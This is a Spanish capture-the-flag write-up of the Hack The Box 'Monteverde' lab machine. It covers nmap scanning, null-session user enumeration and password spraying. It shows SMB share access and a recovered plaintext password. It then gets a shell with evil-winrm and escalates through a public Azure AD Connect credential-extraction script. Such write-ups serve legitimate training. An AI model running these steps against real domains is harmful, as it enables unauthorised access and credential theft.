#  MONTEVERDE MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.172 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49669,49675,49676,49678,49695 -sV -sC 10.10.10.172 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/3.png)

## EXPLOTACION

nos estamos enfrentando a un active directory ya que el servicio de kerberos (88)  esta abierto, vamos a empezar con la enumeracion del protocolo RPC (135) ya que esta abierto:

podemos probar la sesion nula con la herramienta **rpcclient**:

```bash
rpcclient 10.10.10.172 -N -U ""
```

nos deja conectarnos pero a veces esto es un falso positivo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/4.png)

para ver si en realidad la sesion nula es permitida debemos intentar enumerar algo y ver si nos muestra lo que queremos o un **permission denied**, vamos a enumerar usuarios del dominio:

```bash
enumdomusers
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/5.png)

vemos informacion por lo que la sesion nula si estaba permitida, otra forma de enumerar usuarios podia ser con **enum4linux** ya que el puerto 139 esta abierto:

```bash
enum4linux -a 10.10.10.172
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/6.png)

vamos a extraer los usuarios con rpcclient y vamos a filtrar para que solo quede el nombvre de usuario:

```bash
rpcclient 10.10.10.161 -N -U "" -c "enumdomusers" >users.txt

cat users.txt | grep -oP "\[.*?\]" | tr -d "[]" | grep -v "^0x" > users

rmk users.txt
```

se intento un ataque de **ASRPRoast** pero no tuvo exito, asi que algo que puede pasar el un CTF es que a partir de una lista de usuario se puede aplicar fuerza bruta hacia algun servicio. 

Vimos que el puerto 445 (Samba) se encontraba abierto asi que intentemos enumerar recursos con un null session:

```bash
smbmap -H 10.10.10.172
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/7.png)

Hagamos un **autentication spraying** con la lista de usuario mediante la herramienta **crackmapexec** hacia el servicio samba que se encontraba abierto:

```bash
cme smb 10.10.10.172 -u users.txt -p users.txt
```

vemos que encontro unas posibles credenciales validas sin privilegios. (Sabemos que no tiene privilegios porque sino pondria **pwned!**)


![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/8.png)

|Usuario|Password|
|:----:|:----:|
|SABatchJobs|SABatchJobs|

ahora con estas credenciales intentemos enumerar recursos compartidos por samba:

```bash
smbmap -H 10.10.10.172 -u "SABatchJobs" -p "SABatchJobs"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/9.png)

vemos que ahora si podemos y vemos muchos recursos, el que llama la atencion a primera vista es **users$** asi que vamos a conectarnos:

```bash
smbclient "//10.10.10.172/users$" -U "SABatchJobs"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/10.png)

dentro del directorio **mhope** encontramos un archivo:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/11.png)

vamos a descargarlo en nuestra maquina kali:

```bash
get azure.xml
```

si lo abrimos localmente vemos unas credenciales que por intuicion creeriamos que le pertenece al usuario **mhope**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/12.png)

muy bien tenemos un nuevo par de credenciales:

|Usuario|Password|
|:----:|:----:|
|mhope|4n0therD4y@n0th3r$|

vimos en el escaneo de puerto que el puerto 5985se encuentra abieto y si es asi y tenemos credenciales validas podemos usar la herramienta **evil-winrm** para obtener una reverse shell:

```bash
evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$' -e . -s .
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/13.png)

funciono! Estamos dentro y podemos ver la flag user.txt.

## ELEVACION DE PRIVILEGIOS

Para la escalada de privilegios se realizo la enumeracion de privilegios, usuario, servicios y todo lo que normamente se hace, (en caso de no encontrar nada se puede ir por winPEAS) al ver informacion del usuario con el que nos autenticamos vemos que pertenece a un grupo poco usual:

```bash
net user mhope
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/14.png)

estamos frente un Azure, o eso parece de hecho el archivo donde encontramos las credenciales parecia un archivo propio de azure pero veamos si podemos hacer algo con eso. Busque en google **privilege escalation Azure Admins github**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/15.png)

el primer link muestra un script que extrae credenciales de **Azure AD Connect service**: [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/16.png)

veamos si tiene ese servicio, podemos ver esto de dos formas.

- con netstat si corre bajo un puerto en especifico
- ver en los **Program Files** de la maquina

hagamos lo segundo primero:

```bash
cd C:\Program Files
ls *Azure*
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/17.png)

al parecr si tnemos ese servicio asi que podemos intentar ejecutar ese script, para ello nos lo pasamos por evil-winrm al equipo victima:

```bash
upload Azure-ADConnect.ps1
```

Una vez ya lo tenemos en la maquina victima lo importmaos y ejecutamos:

```bash
Import-Module ".\Azure-ADConnect.ps1"

Azure-ADConnect -server 10.10.10.172 -db ADSync
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/18.png)

Y obtenemos las credenciales del usuario administrador, ahora podemos conectarnos via **evil-winrm** y obtener la otra flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/MONTEVERDE/images/19.png)







